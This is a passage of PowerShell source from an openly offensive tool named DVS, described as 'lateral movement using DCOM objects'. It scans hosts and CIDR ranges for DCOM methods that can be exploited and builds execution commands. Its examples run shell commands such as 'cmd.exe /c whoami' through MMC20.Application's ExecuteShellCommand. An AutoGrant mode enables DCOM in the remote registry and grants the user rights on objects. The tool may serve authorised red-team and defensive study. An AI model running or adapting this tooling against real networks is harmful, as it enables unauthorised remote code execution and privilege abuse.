    $MissionInfo = @{FunctionName="Start-COMObjectInstance"; Arguments=@{ObjectName=$ObjectName; RemoteIP=$RemoteIP; isGUID=(is-GUID -ObjectName $ObjectName)}}
    $res = Invoke-NamedpipeMission -MissionInfo $MissionInfo
    if($res.IsSuccess) {
        Write-Log -Level INFO -Message "$($ObjectName) Is accessible!"
    } else {
        Write-Log -Level ERROR -Message "Can't Interact with $($ObjectName)!"
    }
    return $res.IsSuccess
    

}

function Get-UserGroupsUsingADSI {
    param(
        [Parameter(Mandatory = $true)]
        [string]$RemoteIP,
        [Parameter(Mandatory = $true)]
        [string]$Username
    )
    $res = Invoke-NamedpipeMission -MissionInfo @{FunctionName="Get-UserGroupsUsingADSI"; Arguments=@{RemoteIP=[string]$RemoteIP; Username=$Username}}
    if([bool]$res.IsSuccess) {
        Write-Log -Level VERBOSE -Message "Resolved user groups using ADSI (Identity: $($Username))"
        $res.Result|Foreach {
            $global:GroupSIDList[$_.GroupName] = $_.SID
            %{ $_.SID }
        }
        return
    }
    return [System.Array]@()
    

}

function Get-GroupSIDUsingADSI {
    param(
        [Parameter(Mandatory = $true)]
        [string]$RemoteIP,
        [Parameter(Mandatory = $true)]
        [string]$GroupName
    )
    $res = Invoke-NamedpipeMission -MissionInfo @{FunctionName="Get-GroupSIDUsingADSI"; Arguments=@{RemoteIP=[string]$RemoteIP; GroupName=$GroupName}}
    if([bool]$res.IsSuccess) {
        return [System.Array]$res.Result
    }
    return [System.Array]@()
    

}

function Get-UserSIDUsingADSI {
    param(
        [Parameter(Mandatory = $true)]
        [string]$RemoteIP,
        [Parameter(Mandatory = $true)]
        [string]$Username
    )
    $res = Invoke-NamedpipeMission -MissionInfo @{FunctionName="Get-UserSIDUsingADSI"; Arguments=@{RemoteIP=[string]$RemoteIP; Username=$Username}}
    return $res.Result
    

}


function Get-Object-Info {
    param(
        [string]$ObjectPath
    )
    $MissionInfo = @{FunctionName="Get-Object-Info"; Arguments=@{ObjectPath=$ObjectPath}}
    $res = Invoke-NamedpipeMission -MissionInfo $MissionInfo
    if([bool]$res.IsSuccess) {
        return [System.Array]$res.Result
    }
    return [System.Array]@()
}


function Browse-COMProperty {
    param(
        [string]$ObjectPath,
        [Parameter(Mandatory = $true)]
        [string]$PropertyName

    )
    $MissionInfo = @{FunctionName="Browse-COMProperty"; Arguments=@{ObjectPath=$ObjectPath; PropertyName=$PropertyName}}
    $res = Invoke-NamedpipeMission -MissionInfo $MissionInfo
    return [bool]$res.IsSuccess
}


function Set-COMProperty {
    param(
        [string]$ObjectPath,
        [Parameter(Mandatory = $true)]
        [string]$PropertyName,
        [Parameter(Mandatory = $true)]
        $ArgumentList
    )
    $MissionInfo = @{FunctionName="Set-COMProperty"; Arguments=@{ObjectPath=$ObjectPath; PropertyName=$PropertyName; ArgumentList=$ArgumentList}}
    $res = Invoke-NamedpipeMission -MissionInfo $MissionInfo
    return [bool]$res.IsSuccess
}


function Get-FunctionParameters {
    param(
        [string]$ObjectPath,
        [Parameter(Mandatory = $true)]
        [string]$FunctionName
    )
    $res = Invoke-NamedpipeMission -MissionInfo @{FunctionName="Get-FunctionParameters"; Arguments=@{ObjectPath=$ObjectPath; FunctionName=$FunctionName}}
    if([bool]$res.IsSuccess) {
        return [string]$res.Result
    }
    return ""
}


function Quit-COMObject {
    param()
    $res = Invoke-NamedpipeMission -MissionInfo @{FunctionName="Quit-COMObject"}
    if([bool]$res.IsSuccess) {
        return [string]$res.Result
    }
    return ""
}

function Test-DCOMStatus {
    [OutputType([bool])]
    [CmdletBinding(SupportsShouldProcess=$true)]
    param(
        [switch]$AutoGrant
    )
    # This function is responsible to probe if DCOM feature is enabled on the remote machine, and enable the DCOM feature if authogrant mode is flagged

    if((Read-RegString -Key "SOFTWARE\Microsoft\Ole" -Value "EnableDCOM") -ne "Y") { # Probe if remote DCOM feature is enabled
        if($AutoGrant) {
            if((Write-RegString -Key "SOFTWARE\Microsoft\Ole" -Value "EnableDCOM" -String "Y")) { # Enable DCOM feature
                $global:IsDCOMStatusChanged = $true
                return $true
            }
        }
        Write-Log -Level ERROR -Message "DCOM Access is not allowed."
        return $false
    }
    Write-Log -Level VERBOSE -Message "DCOM Access is allowed!"
    return $true
}


function Get-LaunchCommand {
    [OutputType([String])]
    param
    (
        [Parameter(Mandatory = $true)]
        [string]$ObjectName,
        [Parameter(Mandatory = $true)]
        [string]$RemoteIP
    )

    # This function is responsible to generates launch command

    if(is-GUID -ObjectName $ObjectName) {
        return '$([activator]::CreateInstance([type]::GetTypeFromCLSID("' + $ObjectName + '","' + $RemoteIP + '")))';
    }
    return '$([activator]::CreateInstance([type]::GetTypeFromProgID("' + $ObjectName + '", "' + $RemoteIP + '")))';
}



function _Generate-ExecutionCommand {
    [OutputType([String])]
    [CmdletBinding(SupportsShouldProcess=$true)]
    param
    (
        [Parameter(Mandatory = $true)]
        [string]$ObjectName,
        [Parameter(Mandatory = $true)]
        [string]$ObjectPath,
        [Parameter(Mandatory = $true)]
        [string]$OverloadDefinitions,
        [switch]$forceVerbose
    )
     # This function is responsilbes to explore DCOM object and generates execution command
    try {
        $cmd = $(Get-LaunchCommand -RemoteIP $RemoteIP -ObjectName $ObjectName)
        # Add the ObjectPath until the function name
        $cmd += "." + $((Skip-LastItem -Array ($ObjectPath.Split("."))) -join ".")
        if(!($cmd.Substring($cmd.Length-1) -eq ".")) {
            $cmd += "."
        }
        $cmd += $(($OverloadDefinitions.Split(" ")|Select -Skip 1) -join "") # Get the function arguments
        return $cmd
    } catch {
        Write-Log -Level ERROR -Message $_ -forceVerbose:$forceVerbose
        return $false
    }
    
}


function Invoke-DCOMAnalyzer {
    [CmdletBinding(SupportsShouldProcess=$true)]
    param
    (
        [Parameter(Mandatory = $true)]
        [string]$ObjectName,
        [System.Int32]$MaxDepth = 5,
        [string]$ObjectPath = "",
        [Parameter(Mandatory = $true)]
        [string]$RemoteIP,
        [System.Int32]$MaxResults=0,
        [switch]$SkipRegAuth,
        [switch]$CheckAccessOnly
    )
    # This function is responsible to probe and analyze DCOM access, then create a DCOM object and enumerate it
    
    if(!(Start-COMObjectInstance -ObjectName $ObjectName -RemoteIP $RemoteIP)) { # if the object is unresolvable, return
        return
    }
    Write-Log -Level INFO -Message  "Scanning $($ObjectName) object.."
    if($CheckAccessOnly) { # if CheckAccessOnly flagged, add the object name to the results file and finish
        Add-Result -ObjectName $ObjectName -ObjectPath "" -RemoteIP $RemoteIP -CheckAccessOnly -SkipRegAuth:$SkipRegAuth
        return
    }
    try {
        $Blacklist = New-Object System.Collections.ArrayList # Path blacklist in order to prevent race conditions
        Enumerate-DCOMObject -Blacklist $Blacklist -ObjectName $ObjectName -MaxDepth $MaxDepth -RemoteIP $RemoteIP -MaxResults $MaxResults -SkipRegAuth:$SkipRegAuth|Out-Null
    } catch {
        Write-Log -Level ERROR -Message $_
    }
    
}

function Enumerate-DCOMObject {
    [CmdletBinding(SupportsShouldProcess=$true)]
    param
    (
        [Parameter(Mandatory = $true)]
        $Blacklist,
        [Parameter(Mandatory = $true)]
        [string]$ObjectName,
        [Parameter(Mandatory = $true)]
        [System.Int32]$MaxDepth,
        [string]$PropertyName = "",
        [string]$ObjectPath = "",
        [System.Int32]$CurrentDepth = 0,
        [System.Int32]$MaxResults=0,
        [Parameter(Mandatory = $true)]
        [string]$RemoteIP,
        [switch]$SkipRegAuth
    )
    try {
        # This function is responsible to enumerate COM objects recursive until the depth is equal to the MaxDepth
        $FullObjectPath = $ObjectPath
        if($PropertyName) { # If attribute is provided, add it the the object path
            $FullObjectPath = Iif -Condition $ObjectPath -Right "$($ObjectPath).$($PropertyName)" -Wrong $PropertyName
            # If the object path is not empty, add the attribute the the object path, else, assign the attribute as the root objectpath
            $CurrentDepth += 1
            if(!(Browse-COMProperty -ObjectPath $ObjectPath -PropertyName $PropertyName)) {
                return
            }
        }
    
        if($($CurrentDepth) -ge $MaxDepth) { # if the max depth is reached, break the loop
            return
        }
        foreach($MemberInfo in (Get-Object-Info -ObjectPath $FullObjectPath| Sort-Object {Get-Random})) {
            if(is-MaxResultsReached -ObjectName $ObjectName -MaxResults $MaxResults) { # If the max results is reached, break the loop.
                return
            }
            # If property is empty, continue to the next property
            if(!$MemberInfo.Name) {
                continue
            }

            # If property is a native function name, continue to the next property
            if(Find-InArray -Content $MemberInfo.Name -Array $global:NativeFunctions) {
                continue
            }

            # If we already run through this property, continue to the next property
            if($blacklist.Contains($MemberInfo.Name)) {
                continue
            }
            $workingLocation = Iif -Condition $FullObjectPath -Right "$($ObjectName).$($FullObjectPath).$($MemberInfo.Name)" -Wrong "$($ObjectName).$($MemberInfo.Name)"
            Write-Log -Level VERBOSE -Message "Working on $($workingLocation)"
            # It is the function, check if is vulnerable, if it is, add it to the results.
            # Nevertheless, continue to the next property
            if($MemberInfo.Type -eq "Method") {
                # if the function might be exploitable, and append it to the results file
                if(!(Find-VulnerableFunction -FunctionName $MemberInfo.Name)) {
                    continue
                }
                $OverloadDefinitions = Get-FunctionParameters -ObjectPath $FullObjectPath -FunctionName $MemberInfo.Name
                if($OverloadDefinitions -and !(Check-FunctionExploitationPossibility -OverloadDefinitions $OverloadDefinitions)) {
                    continue
                }
                $ResultsPath = Iif -Condition $FullObjectPath -Right "$($FullObjectPath).$($MemberInfo.Name)" -Wrong $MemberInfo.Name
                Add-Result -ObjectName $ObjectName -ObjectPath $ResultsPath -RemoteIP $RemoteIP -OverloadDefinitions $OverloadDefinitions -SkipRegAuth:$SkipRegAuth
                continue         
                    
            }
            $ClonedBlacklist = {$($Blacklist|?{$_})}.Invoke()
            $ClonedBlacklist.Add($MemberInfo.Name)| Out-Null # Add the property to the blacklist
            Enumerate-DCOMObject -MaxResults $MaxResults -Blacklist $ClonedBlacklist -PropertyName $MemberInfo.Name -ObjectPath $FullObjectPath -ObjectName $ObjectName -MaxDepth $MaxDepth -CurrentDepth $CurrentDepth -RemoteIP $RemoteIP -SkipRegAuth:$SkipRegAuth

        }

    } catch {
        Write-Log -Level ERROR -Message $_
    }
}


# Exported functions

function Invoke-DCOMObjectScan {
    <#
        .SYNOPSIS
        D(COM) V(ulnerability) S(canner) AKA Devious swiss army knife - Lateral movement using DCOM Objects

        .DESCRIPTION
        Invoke-DCOMObjectScan function allows you to scan DCOM objects and find vulnerable functions via a list of patterns or exact function names that you included in a file.

        .PARAMETER MaxDepth
        Specifies the maximum depth of DCOM object.

        .PARAMETER HostList
        Specifies IPAddresses, CIDR ranges or hostnames to interact with (Default: 127.0.0.1).
        You can also specify CIDR, and set bulk of ranges using comma
        Example: 10.211.55.1/24
        Example 2: 10.211.55.1/24, 10.211.56.1, 10.211.57.1/24, anyhostname

        .PARAMETER Type
        Specifies the scan type
            All - Scan for all the available DCOM Objects of a remote machine (remote-registry read authorization is required)
            List - scan for all DCOM Objects that describe on the ObjectListFile location
            Single - Scan specific DCOM Object

        .PARAMETER FunctionListFile
        Specifies the function/method list file that contains:
        vulnerable function name (i.e. "execute") OR a function name patterns (i.e. "exec*")
        Note: PLEASE PROVIDE FULL PATH (i.e. c:\func_name_patterns.txt)

        .PARAMETER MaxResults
        Specifies the max amount of usable function within each scanned object
        Note: If this parameter is not set, the amount of results will not be limited.
        
        .PARAMETER ObjectListFile
        Specifies the DCOM Object list to scan (Available only on "List" type) - PLEASE PROVIDE FULL PATH (i.e. c:\object_list.txt)
        
        .PARAMETER ObjectName
        Specifies the exact DCOM Object to scan (Available only on "Single" type).

        .PARAMETER Username
        Specifies the username to use for access.
        Note: The credentials are necessary even if the SkipRegAuth flag is set. if you don't set credentials, the tool will attempt to access the remote machine via your active session

        .PARAMETER Password
        Specifies the password to use for access.
        Note: The credentials are necessary even if the SkipRegAuth flag is set. if you don't set credentials, the tool will attempt to access the remote machine via your active session

        .PARAMETER AutoGrant
        AutoGrant mode allows you to grant yourself permission to the remote DCOM object.
        (This is required when don't have the rights to interact with the DCOM object (Not available on SkipRegAuth mode)).
        Windows allows by default the following ACTIVE SESSIONS:
            Administrators
            System

        .PARAMETER CheckAccessOnly
        Show you only accessible DCOM objects without scanning.

        .PARAMETER SkipPermissionChecks
        Try to blindly launch the remote object, without checking if the principal-identity have access to it using (Will not analyze ACL permissions).
        This flag is created to solve the edge-case in which the tool have read access to the HKLM Hive, but can't resolve the groups the current logged-on/provided user is a member of.

        .PARAMETER SkipRegAuth
        Skip registry access (Solve the edge-case when you have access to the machine, but not have read access to the HKLM Hive)
        Note: this flag is not available on the "All" type, due to the fact that it needs to interact with the registry of the remote machine,
        also, the tool will not analyze ACL permissions, and when the tool will success, it will resolve all the information about the object, except the details mentioned on the registry(Like object name, executable file, etc.)
       
        .PARAMETER Verbose
        Get Verbose logging

        .EXAMPLE

        Enumerates and Scan "MMC20.Application" (ProgID) object from the attacker machine to the "DC01" host without querying the registry.

        PS> Invoke-DCOMObjectScan -Type Single -ObjectName "MMC20.Application" -HostList DC01 -SkipRegAuth -Username "lab\administrator" -Password "Aa123456!" -Verbose
        Note: The tool will not analyze ACL permissions, and when the tool will success, it will resolve all the information about the object, except the details mentioned on the registry(Like object name, executable file, etc.)

        .EXAMPLE

        Check whether the "MMC20.Application" (ProgID) object is accessible from the attacker machine to the "DC01" host without first querying and verifying the access list of the DCOM object.

        PS> Invoke-DCOMObjectScan -Type Single -ObjectName "MMC20.Application" -HostList DC01 -SkipPermissionChecks -CheckAccessOnly -Verbose

        .EXAMPLE

        Validates whether the "MMC20.Application" (ProgID) is applicable through 10.211.55.4/24 ip addresses range. If exists, he tool will try to enumerate the information about it. (using the current logged-on user session).
        
        PS> Invoke-DCOMObjectScan -Type Single -ObjectName "MMC20.Application" -Hostlist "10.211.55.4/24" -CheckAccessOnly -Verbose

        .EXAMPLE

        Validates if the "{00020812-0000-0000-C000-000000000046}" CLSID through 10.211.55.4 ip range object exists and accessible. If exists, the tool will resolve the information about it. (By using lab\administrator credentials).
        
        PS> Invoke-DCOMObjectScan -Type Single -ObjectName "{00020812-0000-0000-C000-000000000046}" -Hostlist "10.211.55.4" -CheckAccessOnly -Username "lab\administrator" -Password "Aa123456!" -Verbose

        .EXAMPLE
        
        Scans all the objects stored on a specified path (e.g. "C:\Users\USERNAME\Desktop\DVS\objects.txt") through 10.211.55.4 ip address, and finds the function list located in the specified file like "vulnerable.txt" using the "lab\administrator" credentials with the _following configuration_:
        Max depth: 4
        Max results: 1 (1 result for each object)
        AutoGrant mode: If we don't have access to the object or if the DCOM feature is disabled, enable the DCOM feature and perform automatic grant to the relevant DCOM object.
        Finally, revert the machine to the same state as before the attack.
        
        PS> Invoke-DCOMObjectScan -MaxDepth 4 -Type List -ObjectListFile "C:\Users\USERNAME\Desktop\DVS\objects.txt" -FunctionListFile "C:\Users\USERNAME\Desktop\DVS\vulnerable.txt" -AutoGrant -Username "lab\administrator" -Password "Aa123456!" -Hostlist "10.211.55.4" -MaxResults 1 -Verbose

        .EXAMPLE

        Scans all the objects stored on the available remote machines from the 10.211.55.1/24 range and finds potential vulnerable functions from the list located on the selected file (e.g. "C:\Users\USERNAME\Desktop\DVS\vulnerable.txt").

        PS> Invoke-DCOMObjectScan -MaxDepth 4 -Type All  -FunctionListFile "C:\Users\USERNAME\Desktop\DVS\vulnerable.txt" -Hostlist "10.211.55.1/24" -Verbose
    #>
    [CmdletBinding(SupportsShouldProcess=$true)]
    param
    (
        [System.Int32]$MaxDepth = "4",
        [string]$Hostlist="127.0.0.1",
        [Parameter(Mandatory=$true)]
        [ValidateSet("All","List","Single")]
        [string]$Type,
        [string]$FunctionListFile,
        [string]$ObjectListFile,
        [string]$ObjectName="",
        [string]$Username="",
        [string]$Password="",
        [System.Int32]$MaxResults=0,
        [switch]$AutoGrant,
        [switch]$CheckAccessOnly,
        [switch]$SkipRegAuth,
        [switch]$SkipPermissionChecks
    )
    try {
        Start-DefaultTasks -Type Init|Out-Null

        switch($Type) {
            "All" {
                if($SkipRegAuth) {
                    Write-Log -Level ERROR -Message "Can't fetch DCOM list without authentication!"
                    return
                }
                break
            }
            "List" {
                if(!$ObjectListFile) {
                    Write-Log -Level ERROR "$($ObjectListFile) not assigned!"
                    return
                }
                break
            }
            "Single" {
                if(!$ObjectName) {
                    Write-Log -Level ERROR "ObjectName is not specified!"
                    return
                }
                break
            }
        }

        if(!$CheckAccessOnly) {
            if(!$FunctionListFile) {
                Write-Log -level Error -Message "please specify the FunctionListFile parameter!"
                return
            }
            if(!$(Parse-FunctionListFile -FileLocation $FunctionListFile)) {
                return
            }
        }
        $Username = Check-Username -Username $Username
        Write-Log -Level INFO -Message "[+] Scanning started."
        foreach($RemoteIP in (Enum-HostList -HostList $Hostlist)) {
            try {
                if(!(Start-DefaultTasks -Type StartTask -RemoteIP $RemoteIP -Username $Username -Password $Password)) {
                    continue
                }

                if(!$SkipRegAuth) {  # If SkipRegAuth is not specified
                    if(!(Test-RegistryConnection -RemoteIP $RemoteIP -Hive HKLM -CheckWritePermissions:$AutoGrant)) {
                        Write-Log -Level ERROR -Message "Can't interact with HKLM! Please try to use -SkipRegAuth flag"
                        continue
                    }

                    if(!$SkipPermissionChecks) { # If SkipPermissionChecks is not specified
                        if(!(Test-DCOMStatus -AutoGrant:$AutoGrant)) {
                            continue
                        }
                        $global:usergroups = Get-UserGroup -RemoteIP $RemoteIP -Username $Username.Split("\")[-1]
                        $DefaultChecks = Invoke-DefaultRightAnalyzer -RemoteIP $RemoteIP -AutoGrant:$AutoGrant
                    }
                }
        
                

                & {
                    switch($Type) {
                        "All" {
                            Get-DCOMObjectList -RemoteIP $RemoteIP
                            break
                        }
                        "List" {
                            (Read-File -FileName $ObjectListFile -AsArray) | Select -Unique| Sort-Object {Get-Random}
                            break
                        }
                        "Single" {
                            %{ $ObjectName }
                            break
                        }
                    }
                }| ForEach {
                    $ObjectName = Wrap-CLSID -ObjectName $_
                    if(!$SkipRegAuth -and !$SkipPermissionChecks) {
                        $CLSIDChecks = Invoke-DCOMObjectRightAnalyzer -RemoteIP $RemoteIP -ObjectName $ObjectName -DefaultChecks:$DefaultChecks -AutoGrant:$AutoGrant
                        if(!$CLSIDChecks) {
                            Write-Log -Level ERROR -Message "You dont have permissions to access $($ObjectName) object!"
                            continue
                        }
                    }
                    Invoke-DCOMAnalyzer -ObjectName $ObjectName -MaxDepth $MaxDepth -MaxResults $MaxResults -RemoteIP $RemoteIP -CheckAccessOnly:$CheckAccessOnly -SkipRegAuth:$SkipRegAuth|Out-Null
                    Write-Log -Level INFO -Message  "$($ObjectName) Scanned!"
                }
            } catch {
                Write-Log -Level ERROR -Message $_
            } finally {
                Start-DefaultTasks -Type EndTask -AutoGrant:$AutoGrant|Out-Null
            }
        }

    } catch {
        Write-Log -Level ERROR -Message $_
    } finally {
        Start-DefaultTasks -Type Finish|Out-Null
    }
}

function Get-ExecutionCommand {
    <#
        .SYNOPSIS
        D(COM) V(ulnerability) S(canner) AKA Devious swiss army knife - Lateral movement using DCOM Objects

        .DESCRIPTION
        Get-ExecutionCommand function allows to generate a PowerShell payload that will interact and execute with the remote DCOM function with the relevant parameters.

        .PARAMETER ObjectName
        Specifies the exact DCOM Object to launch.

        .PARAMETER ObjectPath
        Specifies the exact object path of the DCOM object (e.g. ActiveView.ExecuteShellCommand).

        .PARAMETER HostList
        Specifies IPAddresses, CIDR ranges or hostnames to interact with (Default: 127.0.0.1).
        You can also specify CIDR, and set bulk of ranges using comma
        Example: 10.211.55.1/24
        Example 2: 10.211.55.1/24, 10.211.56.1, 10.211.57.1/24, anyhostname

       .PARAMETER Username
        Specifies the username to use for access.
        Note: The credentials are necessary even if the SkipRegAuth flag is set. if you don't set credentials, the tool will attempt to access the remote machine via your active session

        .PARAMETER Password
        Specifies the password to use for access.
        Note: The credentials are necessary even if the SkipRegAuth flag is set. if you don't set credentials, the tool will attempt to access the remote machine via your active session

        .PARAMETER AutoGrant
        AutoGrant mode allows you to grant yourself permission to the remote DCOM object.
        (This is required when don't have the rights to interact with the DCOM object (Not available on SkipRegAuth mode)).
        Windows wil allow by default the following ACTIVE SESSIONS:
            Administrators
            System

        .PARAMETER SkipPermissionChecks
        Try to blindly launch the remote object, without checking if the principal-identity have access to it using (Will not analyze ACL permissions).
        This flag is created to solve the edge-case in which the tool have read access to the HKLM Hive, but can't resolve the groups the current logged-on/provided user is a member of.

        .PARAMETER SkipRegAuth
        Skip registry access (Solve the edge-case when you have access to the machine, but not have read access to the HKLM Hive)
        Note: this flag is not available on the "All" type, due to the fact that it needs to interact with the registry of the remote machine,
        also, the tool will not analyze ACL permissions, and when the tool will success, it will resolve all the information about the object, except the details mentioned on the registry(Like object name, executable file, etc.)

        .PARAMETER Verbose
        Get Verbose logging

        .EXAMPLE

        Checks if the principal-identity is granted to interact with "{00020812-0000-0000-C000-000000000046}" CLSID object through 10.211.55.4 ip address using lab\administrator credentials, then it will generates the execution command.
        
        PS> Get-ExecutionCommand -ObjectName "{00020812-0000-0000-C000-000000000046}" -ObjectPath "DDEInitiate" -HostList "10.211.55.4" -Username "lab\Administrator" -Password "Aa123456!" -Verbose

        .EXAMPLE

        Checks for DCOM access,  
        In case the principal-identity doesn't have the necessary permissions or the DCOM feature is disabled, the tool will enable the DCOM feature, grants identity access and interacts with "MMC20.Application" ProgID object through 10.211.55.4 ip address using lab\administrator credentials, and will generates you the execution command.
        Finally, it will revert the machine to the same state as before the attack.

        PS> Get-ExecutionCommand -ObjectName "MMC20.Application" -ObjectPath "Document.ActiveView.ExecuteShellCommand" -HostList "10.211.55.4" -Username "lab\Administrator" -Password "Aa123456!" -AutoGrant -Verbose

        .EXAMPLE

        Tries to interact with "MMC20.Application" ProgID object through 10.211.55.1/24 ip range using current logged-on session without analyze ACL permissions
        then it will generates the execution command.

        PS> Get-ExecutionCommand -ObjectName "MMC20.Application" -ObjectPath "Document.ActiveView.ExecuteShellCommand" -HostList "10.211.55.1/24" -SkipPermissionChecks -Verbose

        .EXAMPLE

        Tries to interact with "MMC20.Application" ProgID object through 10.211.55.4 ip address, without querying the registry.

        PS> Get-ExecutionCommand -ObjectName "MMC20.Application" -ObjectPath "Document.ActiveView.ExecuteShellCommand" -HostList "10.211.55.4" -SkipRegAuth -Verbose
    #>
    [CmdletBinding(SupportsShouldProcess=$true)]
    param
    (
        [Parameter(Mandatory = $true)]
        [string]$ObjectName,
        [Parameter(Mandatory = $true)]
        [string]$ObjectPath,
        [string]$HostList='127.0.0.1',
        [string]$Username="",
        [string]$Password="",
        [switch]$AutoGrant,
        [switch]$SkipRegAuth,
        [switch]$SkipPermissionChecks
    )
    # This function is responsible to generates execution command of specific DCOM object and path

    try {
        Start-DefaultTasks -Type Init|Out-Null
        $Username = Check-Username -Username $Username
        foreach($RemoteIP in (Enum-HostList -HostList $HostList)) {
             try {
                if(!(Start-DefaultTasks -Type StartTask -RemoteIP $RemoteIP -Username $Username -Password $Password)) {
                    continue
                }
                $ObjectName = Wrap-CLSID -ObjectName $ObjectName

                if(!$SkipRegAuth) {  # If SkipRegAuth is not specified
                    if(!(Test-RegistryConnection -RemoteIP $RemoteIP -Hive HKLM -CheckWritePermissions:$AutoGrant)) {
                        Write-Log -Level ERROR -Message "Can't interact with HKLM! Please try to use -SkipRegAuth flag"
                        continue
                    }

                    if(!$SkipPermissionChecks) { # If SkipPermissionChecks is not specified
                        if(!(Test-DCOMStatus -AutoGrant:$AutoGrant)) {
                            continue
                        }
                        $global:usergroups = Get-UserGroup -RemoteIP $RemoteIP -Username $Username.Split("\")[-1]
                        $DefaultChecks = Invoke-DefaultRightAnalyzer -RemoteIP $RemoteIP -AutoGrant:$AutoGrant
                        $CLSIDChecks = Invoke-DCOMObjectRightAnalyzer -RemoteIP $RemoteIP -ObjectName $ObjectName -DefaultChecks:$DefaultChecks -AutoGrant:$AutoGrant
                        if(!$CLSIDChecks) {
                            Write-Log -Level ERROR -Message "You dont have permissions to access $($ObjectName) object!"
                            continue
                        }
                    }
                }
                
                if(!(Start-COMObjectInstance -ObjectName $ObjectName -RemoteIP $RemoteIP)) {
                    continue
                }
        

                $SplittedPath = $ObjectPath.Split(".")
                $path = ""
                foreach($PropertyName in (Skip-LastItem -Array $SplittedPath)) {
                    if(!(Browse-COMProperty -ObjectPath $path -PropertyName $PropertyName)) {
                        Write-Log -Level ERROR -Message "Can't access ${$path} path!"
                        break
                    }
                    $path = Iif -Condition $path -Right "$($path).$($PropertyName)" -Wrong $PropertyName
                }

                $OverloadDefinitions = Get-FunctionParameters -ObjectPath ((Skip-LastItem -Array $SplittedPath) -join ".") -FunctionName $SplittedPath[-1]
                $cmd = _Generate-ExecutionCommand -ObjectName $ObjectName -ObjectPath $ObjectPath -OverloadDefinitions $OverloadDefinitions
                if(!$cmd) {
                    Write-Log -Level ERROR -Message "$($ObjectPath) not found!"
                    continue
                }
                if(is-GUID -ObjectName $ObjectName) {
                    $clsid, $ProgID, $CLSIDCommand, $ProgIdCommand = @($ObjectName, "", $cmd, "")
                } else {
                    $clsid, $ProgID, $CLSIDCommand, $ProgIdCommand = @("", $ObjectName, "", $cmd)
                }
                Add-ResultRow -ResultRow @($RemoteIP, $false, $clsid, $ProgID, $ObjectPath, $CLSIDCommand, $ProgIdCommand, $false, $false)
                Write-Log -Level INFO -Message $cmd
        
            } catch {
                Write-Log -Level ERROR -Message $_
            } finally {
                Start-DefaultTasks -Type EndTask -AutoGrant:$AutoGrant|Out-Null
            }
        }

    } catch {
        Write-Log -Level ERROR -Message $_
    } finally {
        
        Start-DefaultTasks -Type Finish|Out-Null
    }
    
    
}

function Invoke-ExecutionCommand {
    <#
        .SYNOPSIS
        D(COM) V(ulnerability) S(canner) AKA Devious swiss army knife - Lateral movement using DCOM Objects

        .DESCRIPTION
        Invoke-ExecutionCommand function executes commands via DCOM Object using the logged-on user or provided credentials.

        .PARAMETER ObjectName
        Specifies the exact DCOM Object to grant.

        .PARAMETER HostList
        Specifies IPAddresses, CIDR ranges or hostnames to interact with (Default: 127.0.0.1).
        You can also specify CIDR, and set bulk of ranges using comma
        Example: 10.211.55.1/24
        Example 2: 10.211.55.1/24, 10.211.56.1, 10.211.57.1/24, anyhostname

        .PARAMETER Username
        Specifies the username to use for access.
        Note: The credentials are necessary even if the SkipRegAuth flag is set. if you don't set credentials, the tool will attempt to access the remote machine via your active session

        .PARAMETER Password
        Specifies the password to use for access.
        Note: The credentials are necessary even if the SkipRegAuth flag is set. if you don't set credentials, the tool will attempt to access the remote machine via your active session

        .PARAMETER AutoGrant
        AutoGrant mode allows you to grant yourself permission to the remote DCOM object.
        (This is required when don't have the rights to interact with the DCOM object (Not available on SkipRegAuth mode)).
        Windows wil allow by default the following ACTIVE SESSIONS:
            Administrators
            System

        .PARAMETER SkipPermissionChecks
        Try to blindly launch the remote object, without checking if the principal-identity have access to it using (Will not analyze ACL permissions).
        This flag is created to solve the edge-case in which the tool have read access to the HKLM Hive, but can't resolve the groups the current logged-on/provided user is a member of.

        .PARAMETER SkipRegAuth
        Skip registry access (Solve the edge-case when you have access to the machine, but not have read access to the HKLM Hive)
        Note: this flag is not available on the "All" type, due to the fact that it needs to interact with the registry of the remote machine,
        also, the tool will not analyze ACL permissions, and when the tool will success, it will resolve all the information about the object, except the details mentioned on the registry(Like object name, executable file, etc.)

        .PARAMETER Commands
        Specifies the commands inside a list.
        Struct: @(
            @{
                ObjectPath="The object path that you want to execute"; # i.e. Document.ActiveView.ExecuteShellCommand
                Arguments= @{"arg1", "arg2"} @ i.e.'cmd.exe',$null,"/c whoami > c:\res.txt","Minimized"
            }
        )
        Example: @( @{ObjectPath="Document.ActiveView.ExecuteShellCommand"; Arguments=@('cmd.exe',$null,"/c whoami > c:\res.txt","Minimized")} )

        .PARAMETER Verbose
        Get Verbose logging

        .EXAMPLE

        Checks for DCOM access,  
        In case the principal-identity doesn't have the necessary permissions or the DCOM feature is disabled, the tool will enable the DCOM feature, grant access, Interact with MMC20.Application object through the remote range: 10.211.55.1/24 using current logged-on user session and Execute the following commands:
        1. "cmd.exe /c calc"
        2. Frame.Top attribute to "1"
        Finally, revert the machine to the same state as before the attack.
        
        PS> Invoke-ExecutionCommand -ObjectName "MMC20.Application" -AutoGrant -Commands @( @{ObjectPath="Document.ActiveView.ExecuteShellCommand"; Arguments=@('cmd.exe',$null,"/c calc","Minimized")},@{ObjectPath="Frame.Top";Arguments=@(1)} ) -HostList "10.211.55.1/24" -Verbose

        .EXAMPLE

        Tries to interact with MMC20.Application object using lab\administrator credentials through 10.211.55.4 ip address, and executes the following command: "cmd.exe /c calc".
        
        PS> Invoke-ExecutionCommand -ObjectName "MMC20.Application" -Commands @( @{ObjectPath="Document.ActiveView.ExecuteShellCommand"; Arguments=@('cmd.exe',$null,"/c calc","Minimized")}) -HostList "10.211.55.4" -Username "lab\administrator" -Password "Aa123456!" -Verbose

        .EXAMPLE

        Tries to interact with MMC20.Application object using current logged-on user session without analyze ACL permissions, and executes the following command: "cmd.exe /c calc".
        
        PS> Invoke-ExecutionCommand -ObjectName "MMC20.Application" -Commands @( @{ObjectPath="Document.ActiveView.ExecuteShellCommand"; Arguments=@('cmd.exe',$null,"/c calc","Minimized")}) -HostList "10.211.55.4" -SkipPermissionChecks -Verbose


    #>
    [CmdletBinding(SupportsShouldProcess=$true)]
    param
    (
        [Parameter(Mandatory = $true)]
        [string]$ObjectName,
        [Parameter(Mandatory = $true)]
        [system.object]$Commands,
        [string]$HostList='127.0.0.1',
        [string]$Username="",
        [string]$Password="",
        [switch]$AutoGrant,
        [switch]$SkipRegAuth,
        [switch]$SkipPermissionChecks
    )
    try {
        Start-DefaultTasks -Type Init|Out-Null
        $Username = Check-Username -Username $Username
        foreach($RemoteIP in (Enum-HostList -HostList $HostList)) {
            try {
